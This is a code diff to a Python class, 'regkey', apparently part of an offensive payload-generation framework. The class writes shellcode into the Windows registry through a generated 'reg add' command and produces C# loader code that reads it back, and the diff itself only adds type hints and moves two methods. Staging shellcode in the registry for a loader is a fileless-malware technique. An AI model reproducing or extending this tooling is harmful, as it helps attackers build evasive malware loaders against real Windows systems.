@@ -5,7 +5,7 @@ from cs.utils.formatters import *
 
 class regkey:
 
-    def __init__(self, shellcode, arguments):
+    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
         if 'path' in arguments:
             self.path = arguments['path']
@@ -23,10 +23,16 @@ class regkey:
         elif self.type == 'bytes':
             print(f'reg add "{self.path}" /v "{self.key}" /t REG_BINARY /d "{shellcode.hex()}" /f')
 
-    def imports(self):
+    def imports(self) -> list[str]:
         return ['using Microsoft.Win32;']
 
-    def codeblock(self):
+    def compilerOptions(self) -> list[str]:
+        return []
+
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}()')
+
+    def codeblock(self) -> str:
 
         if self.type == 'str':
             return f"""
@@ -52,9 +58,3 @@ class regkey:
                 return obfuscated;
             }}
 """
-
-    def compilerOptions(self):
-        return []
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}()')
